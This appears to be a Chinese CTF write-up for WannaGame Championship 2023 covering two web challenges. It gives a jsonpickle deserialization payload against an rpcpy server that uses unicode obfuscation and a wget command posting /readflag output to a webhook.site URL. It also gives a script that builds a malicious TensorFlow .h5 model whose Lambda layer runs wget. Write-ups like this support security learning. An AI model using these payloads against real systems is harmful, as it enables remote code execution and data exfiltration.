https://nguyendt.hashnode.dev/wannagame-championship-2023
# web
### Bocchi The RPC Server
一个rpc服务器
rpcpy存在[漏洞](https://github.com/ehtec/rpcpy-exploit/)
但是payload里利用的是pickle,题目中注释掉了
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231206233250.png)


可以使用jsonpickle绕过,记得用linux!!
```python
from typing import Any
import requests

import jsonpickle


class PickleRce(object):
    def __reduce__(self):
        import os
        return os.system, ("whoami",)


# 序列化对象为JSON字符串
json_str=jsonpickle.encode(PickleRce())
print(json_str)

```

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231207000506.png)
然后unicode绕过

---

payload
```json
{
    "name": {
        "py/repr": "binascii/().__class__.__base__.__subclasses__().__getitem__(107).load_module(binascii.unhexlify('6f73').decode()).popen(binascii.unhexlify('2e2e2f72656164666c6167').decode()).read()"
    }
}
```

unicode绕过
```json
{
    "name": {
        "py/reduce": [
            {
                "py/function": "p\u006fsix.s\u0079stem"
            },
            {
                "py/tuple": [
                    "wget https://webhook.site/dfb8094f-ab17-41b5-93fa-e6c353fd4fbd --p\u006fst-data $(/readflag)"
                ]
            }
        ]
    }
}
```


### CountingStars
https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model

一个输入经纬度计算星星数的程序,使用了tensorflow,会加载一个模型`counting_stars.h5`
可以搜索到rce,当加载恶意模型的时候

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("wget https://webhook.site/2f815642-00d7-472d-9507-2af34539836a")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("counting_stars.h5")
```

但是这块的逻辑是请求一个模型,如果文件名\=\=`f'{session["dir"]}/{MODEL}'`则重新从上一级目录拿到未污染的模型,但是模型加载的文件名又是固定的
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231207161321.png)

---
discord上说是条件竞争


### 



# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2023-12-06   22:26